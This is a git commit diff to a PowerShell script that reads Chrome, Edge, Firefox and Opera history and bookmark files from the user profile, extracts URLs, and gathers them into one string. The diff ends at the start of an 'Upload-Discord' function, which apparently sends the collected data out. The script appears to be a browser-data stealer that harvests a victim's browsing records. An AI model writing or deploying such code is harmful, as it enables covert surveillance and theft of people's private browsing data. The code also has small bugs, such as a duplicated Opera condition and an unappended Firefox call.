1272c634fe91669a19ec1aa76d34b511a326a398
Alex Planmarks <125360150+planmarks@users.noreply.github.com>
2023-04-27 17:40:47 +0300

    Update browser-data.ps1

--- browser-data.ps1
+++ browser-data.ps1
@@ -1,22 +1,31 @@
 function Get-BrowserData {
-
     [CmdletBinding()]
     param (	
-    [Parameter (Position=1,Mandatory = $True)]
-    [string]$Browser,    
-    [Parameter (Position=1,Mandatory = $True)]
-    [string]$DataType 
+        [Parameter (Position=1,Mandatory = $True)]
+        [string]$Browser,    
+        [Parameter (Position=1,Mandatory = $True)]
+        [string]$DataType 
     ) 
+
+    Write-Host "Getting data for $Browser $DataType..."
 
     $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 
-    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
-    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
+    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {
+        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+    } elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {
+        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+    } elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
+        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
+    } elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
+        $Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"
+    } elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
+        $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
+    } elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {
+        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
+    } elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {
+        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
+    }
 
     $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
     $Value | ForEach-Object {
@@ -29,22 +38,26 @@ function Get-BrowserData {
                 Data = $_
             }
         }
-    } 
+    }
 }
 
-Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt
+$BrowserData = ""
 
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+$BrowserData += "Chrome History:`n"
+Get-BrowserData -Browser "chrome" -DataType "history" | ForEach-Object { $BrowserData += $_.Data + "`n" }
 
-Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\--BrowserData.txt
+$BrowserData += "Chrome Bookmarks:`n"
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" | ForEach-Object { $BrowserData += $_.Data + "`n" }
 
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP--BrowserData.txt
+$BrowserData += "Edge History:`n"
+Get-BrowserData -Browser "edge" -DataType "history" | ForEach-Object { $BrowserData += $_.Data + "`n" }
 
-Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData.txt
+$BrowserData += "Edge Bookmarks:`n"
+Get-BrowserData -Browser "edge" -DataType "bookmarks" | ForEach-Object { $BrowserData += $_.Data + "`n" }
 
-Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt
+$BrowserData += "Firefox History:`n"
+Get-BrowserData -Browser "firefox" -DataType "history"
 
-Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
 
 function Upload-Discord {
 
